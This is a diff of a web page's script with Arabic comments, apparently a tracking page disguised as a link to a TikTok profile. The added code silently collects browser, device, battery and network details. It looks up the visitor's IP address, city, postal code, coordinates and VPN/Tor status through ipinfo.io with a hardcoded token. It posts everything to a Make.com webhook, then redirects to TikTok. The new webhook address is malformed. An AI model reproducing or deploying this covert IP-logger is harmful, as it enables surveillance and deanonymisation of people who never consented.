@@ -76,100 +76,138 @@
  <script>
   async function collectData() {
     const now = new Date();
-    const localTime = now.toLocaleString("en-US", {
-      year: "numeric",
-      month: "2-digit",
-      day: "2-digit",
-      hour: "2-digit",
-      minute: "2-digit",
-      second: "2-digit",
-      hour12: true
-    });
+    let localTime = "";
+    try {
+      localTime = now.toLocaleString("en-US", {
+        year: "numeric",
+        month: "2-digit",
+        day: "2-digit",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit",
+        hour12: true
+      });
+    } catch (_) {
+      localTime = now.toISOString();
+    }
 
     const userData = {
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      screenSize: `${window.screen.width}x${window.screen.height}`,
-      colorDepth: window.screen.colorDepth,
-      pixelRatio: window.devicePixelRatio,
-      platform: navigator.platform,
-      referrer: document.referrer,
-      online: navigator.onLine,
-      javaEnabled: navigator.javaEnabled(),
-      cookiesEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack,
-      localStorage: !!window.localStorage,
-      sessionStorage: !!window.sessionStorage,
+      userAgent: navigator.userAgent || "",
+      language: navigator.language || "",
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+      screenSize: `${window.screen?.width || ""}x${window.screen?.height || ""}`,
+      colorDepth: window.screen?.colorDepth || "",
+      pixelRatio: window.devicePixelRatio || "",
+      platform: navigator.platform || "",
+      referrer: document.referrer || "",
+      online: navigator.onLine ?? "",
+      javaEnabled: (() => {
+        try {
+          return navigator.javaEnabled();
+        } catch (_) {
+          return false;
+        }
+      })(),
+      cookiesEnabled: navigator.cookieEnabled ?? "",
+      doNotTrack: navigator.doNotTrack ?? "",
+      localStorage: (() => {
+        try {
+          return !!window.localStorage;
+        } catch (_) {
+          return false;
+        }
+      })(),
+      sessionStorage: (() => {
+        try {
+          return !!window.sessionStorage;
+        } catch (_) {
+          return false;
+        }
+      })(),
       timestamp: now.toISOString(),
-      localTime: localTime
+      localTime: localTime,
+      connectionType: "",
+      downlink: "",
+      rtt: "",
+      deviceMemory: "",
+      cpuCores: "",
+      touchSupport: "",
+      batteryLevel: "",
+      isCharging: "",
+      ip: "",
+      hostname: "",
+      city: "",
+      region: "",
+      country: "",
+      loc: "",
+      org: "",
+      postal: "",
+      timezoneFromIP: "",
+      asn: "",
+      vpn: "",
+      proxy: "",
+      tor: ""
     };
 
+    // اتصال الشبكة
     try {
       if (navigator.connection) {
-        userData.connectionType = navigator.connection.effectiveType;
-        userData.downlink = navigator.connection.downlink;
-        userData.rtt = navigator.connection.rtt;
+        userData.connectionType = navigator.connection.effectiveType || "";
+        userData.downlink = navigator.connection.downlink || "";
+        userData.rtt = navigator.connection.rtt || "";
       }
+    } catch (_) {}
 
-      if (navigator.deviceMemory) {
-        userData.deviceMemory = navigator.deviceMemory + " GB";
-      }
+    // بيانات الجهاز
+    try {
+      userData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "";
+      userData.cpuCores = navigator.hardwareConcurrency || "";
+      userData.touchSupport = navigator.maxTouchPoints > 0;
+    } catch (_) {}
 
-      if (navigator.hardwareConcurrency) {
-        userData.cpuCores = navigator.hardwareConcurrency;
-      }
-
-      if (navigator.maxTouchPoints !== undefined) {
-        userData.touchSupport = navigator.maxTouchPoints > 0;
-      }
-
+    // البطارية
+    try {
       if (navigator.getBattery) {
         const battery = await navigator.getBattery();
         userData.batteryLevel = Math.round(battery.level * 100) + "%";
         userData.isCharging = battery.charging;
       }
+    } catch (_) {}
 
-      const ipRes = await fetch("https://ipinfo.io/json?token=cb4dd6c6220e6e");
+    // IP وموقع
+    try {
+      const ipRes = await fetch('https://ipinfo.io/json?token=cb4dd6c6220e6e');
       const ipData = await ipRes.json();
+      userData.ip = ipData.ip || "";
+      userData.hostname = ipData.hostname || "";
+      userData.city = ipData.city || "";
+      userData.region = ipData.region || "";
+      userData.country = ipData.country || "";
+      userData.loc = ipData.loc || "";
+      userData.org = ipData.org || "";
+      userData.postal = ipData.postal || "";
+      userData.timezoneFromIP = ipData.timezone || "";
+      userData.asn = ipData.asn?.asn || "";
+      userData.vpn = ipData.privacy?.vpn || false;
+      userData.proxy = ipData.privacy?.proxy || false;
+      userData.tor = ipData.privacy?.tor || false;
+    } catch (e) {
+      console.error("IP Info Error:", e);
+    }
 
-      userData.ip = ipData.ip;
-      userData.hostname = ipData.hostname;
-      userData.city = ipData.city;
-      userData.region = ipData.region;
-      userData.country = ipData.country;
-      userData.loc = ipData.loc;
-      userData.org = ipData.org;
-      userData.postal = ipData.postal;
-      userData.timezone = ipData.timezone;
-      userData.asn = ipData.asn?.asn;
-      userData.vpn = ipData.privacy?.vpn;
-      userData.proxy = ipData.privacy?.proxy;
-      userData.tor = ipData.privacy?.tor;
-
-      // ✅ فلترة الحقول: إزالة أي null أو undefined أو فاضي
-      const filteredData = {};
-      for (const key in userData) {
-        const value = userData[key];
-        if (value !== undefined && value !== null && value !== "") {
-          filteredData[key] = value;
-        }
-      }
-
-      await fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
+    // إرسال البيانات
+    try {
+      await fetch("j1ctaxfofcotsq4sj7tk8gefd4jpnrcy@hook.eu2.make.com", {
         method: "POST",
-        body: JSON.stringify(filteredData),
+        body: JSON.stringify(userData),
         headers: {
           "Content-Type": "application/json"
         }
       });
-
-      console.log("✅ Data sent successfully to Make");
-
+      console.log("✅ Data sent to Make");
     } catch (err) {
-      console.error("❌ Error collecting or sending data:", err);
+      console.error("❌ Error sending data:", err);
     } finally {
-      // ⏱️ التحويل بعد 2.5 ثانية
       setTimeout(() => {
         window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
       }, 2500);
